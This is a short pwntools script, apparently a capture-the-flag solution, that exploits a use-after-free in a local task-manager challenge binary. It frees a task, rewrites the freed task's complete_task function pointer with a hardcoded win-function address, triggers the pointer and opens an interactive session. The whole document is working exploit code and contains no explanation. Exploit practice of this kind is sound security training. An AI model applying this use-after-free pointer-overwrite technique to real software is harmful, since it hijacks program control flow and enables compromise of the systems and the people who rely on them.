from pwn import *

p = process('./chall')

win_addr = 0x401276 

p.sendlineafter("> ", "1")
p.sendafter("Enter the name of the task: ", "A" * 32)

p.sendlineafter("> ", "3")
p.sendlineafter("Enter the index of the task to free: ", "0")

# Edit the freed task to overwrite the complete_task pointer
payload = b"A" * 32  # Fill the task_name buffer
payload += p64(win_addr)  # Overwrite complete_task with win function address
p.sendlineafter("> ", "4")
p.sendlineafter("Enter the index of the task to edit: ", "0")
p.sendafter("Enter the new name of the task: ", payload)

# Complete the freed task to trigger the win function
p.sendlineafter("> ", "2")
p.sendlineafter("Enter the index of the task to complete: ", "0")

p.interactive()